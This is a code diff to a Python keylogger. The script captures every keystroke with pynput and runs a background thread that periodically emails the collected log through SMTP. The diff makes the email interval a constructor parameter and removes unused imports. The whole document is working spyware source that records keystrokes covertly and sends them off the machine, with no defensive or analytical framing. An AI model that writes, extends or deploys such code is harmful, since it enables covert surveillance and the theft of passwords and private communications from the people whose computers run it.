@@ -1,14 +1,13 @@
-
-from typing import Awaitable
 import pynput.keyboard as k
 import threading
 import smtplib
-import datetime,time
+import datetime
 import ssl
 
 class Keylogger:
-    def __init__(self):
+    def __init__(self,interval):
         self.key_log = ''
+        self.time_interval = interval
 
     def key_press(self, key):
         try: 
@@ -32,15 +31,16 @@ class Keylogger:
     def start(self):
         listen_keyboard = k.Listener(on_press=self.key_press)
         with listen_keyboard:
-            email = Send_Email(self.key_log)
+            email = Send_Email(self.key_log,self.time_interval)
             email.start()
             listen_keyboard.join()
 
 class Send_Email(threading.Thread):
-    def __init__(self,key):
+    def __init__(self,key,interval):
         threading.Thread.__init__(self)
         self.event = threading.Event()
         self.key_log = key
+        self.time_interval = interval
     
     def run(self):
          while not self.event.is_set():
@@ -73,8 +73,8 @@ class Send_Email(threading.Thread):
                     server.quit()
                 except Exception as e:
                     print (e)
-            self.event.wait(5)
+            self.event.wait(self.time_interval)
 
    
-klogger = Keylogger()
+klogger = Keylogger(5)
 klogger.start()
